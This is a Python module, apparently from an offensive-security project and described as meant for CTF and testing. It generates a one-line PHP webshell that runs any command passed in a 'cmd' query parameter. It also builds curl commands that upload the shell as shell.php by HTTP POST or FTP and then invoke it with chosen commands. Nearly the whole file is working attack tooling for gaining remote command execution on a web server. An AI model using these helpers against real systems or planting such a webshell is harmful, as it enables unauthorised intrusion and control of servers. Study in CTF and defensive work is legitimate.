"""PHP webshell and curl utilities for web exploitation.

This module provides helpers for generating a minimal PHP webshell string and
constructing a curl command to upload it. Intended for CTF and testing utilities
within the CAI project. Keep outputs inert (do not execute uploads).
"""
import shlex
from typing import Optional, Tuple
from urllib.parse import quote_plus


def generate_php_webshell(
    target_url: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = "http",
    ctf: Optional[object] = None,
) -> Tuple[str, Optional[str]]:
    """
    Generate a small PHP webshell payload and optionally an upload command.

    Returns:
        Tuple[str, Optional[str]]: (webshell_content, upload_command_or_None)
    """
    webshell = "<?php system($_GET['cmd']); ?>"
    upload_cmd: Optional[str] = None

    if not target_url:
        return webshell, upload_cmd

    if not port:
        port = 21 if protocol == "ftp" else 80

    quoted = shlex.quote(webshell)
    if protocol == "ftp":
        upload_cmd = f"printf %s {quoted} | curl -T - ftp://{target_url}:{port}/shell.php"
    else:
        upload_cmd = (
            f"printf %s {quoted} | curl -X POST http://{target_url}:{port} "
            f"-F 'file=@-;filename=shell.php'"
        )

    return webshell, upload_cmd


def generate_curl_upload_cmd(url: str, filename: str = "shell.php", ctf: Optional[object] = None) -> Tuple[str, str]:
    """Compatibility wrapper that returns a webshell and a curl upload command."""
    webshell, cmd = generate_php_webshell(target_url=url)
    if cmd:
        return webshell, cmd
    return webshell, f"curl -X POST '{url}' -F \"file=@{filename}\""


def curl_webshell(url: str, command: str, cmd_param: str = "cmd") -> str:
    """Return a curl command that calls the webshell with the provided command."""
    encoded_cmd = quote_plus(command)
    return f"curl '{url}?{cmd_param}={encoded_cmd}'"


def upload_webshell(url: str, filename: str = "shell.php", ctf: Optional[object] = None) -> Tuple[str, str]:
    """Return webshell content and a curl command to upload it to `url`."""
    shell, _ = generate_php_webshell(target_url=url)
    quoted = shlex.quote(shell)
    curl_cmd = f"printf %s {quoted} | curl -X POST {url} -F 'file=@-;filename={filename}'"
    return shell, curl_cmd
